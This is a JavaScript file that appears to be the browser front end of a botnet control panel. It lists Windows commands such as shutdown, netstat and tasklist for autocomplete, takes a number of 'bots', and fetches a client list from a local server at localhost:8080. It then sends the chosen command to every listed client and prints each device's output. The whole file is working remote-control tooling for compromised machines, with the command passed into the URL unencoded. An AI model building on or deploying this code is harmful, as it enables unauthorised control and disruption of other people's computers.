const commandInput = document.getElementById("command-input");
const numBotsInput = document.getElementById("num-bots-input");
const sendButton = document.getElementById("send-button");
const outputArea = document.getElementById("output-area");

// Mockup of autocomplete suggestions for Windows commands
const commandSuggestions = [
  "dir",
  "cd",
  "ipconfig",
  "ping",
  "shutdown",
  "tasklist",
  "netstat",
  "help",
  "cls",
];

// Autocomplete feature
new Awesomplete(commandInput, { list: commandSuggestions });

sendButton.addEventListener("click", () => {
  const command = commandInput.value;
  const numBots = numBotsInput.value;

  if (numBots < 11) {

     // Here you can implement the logic to execute the command with the specified number of bots
    // For demonstration purposes, we'll just update the output area with the entered values.
    const output = `Executing "${command}" with ${numBots} bots...`;
    outputArea.value = output;

    fetch("http://localhost:8080/api/s/clients", {
      method: "GET",
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    }).then(async (res) => {
      let data = await res.text();
      console.log(JSON.parse(data));
      let i = 0;
      JSON.parse(data).forEach((c) => {
        i += 1;
        fetch(`http://localhost:8080/command?command=${command}&id=${c}`, {
          method: "GET",
        //   body: {
        //     command: command,
        //     id: c,
        //   },
          headers: {
            "Content-type": "application/json; charset=UTF-8",
          },
        }).then(async (res) => {
          let commandOutput = await res.text();
        //   console.log(JSON.parse(commandOutput));
          outputArea.value += `\n
          ~~~~~~~~~~~~~~~~~~~~~~~ Device ${i} ~~~~~~~~~~~~~~~~~~~~~~~
           \n 
           ${commandOutput} 
           \n
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

           \n`;

        });
      });
    });

   
  } else {
  }
});
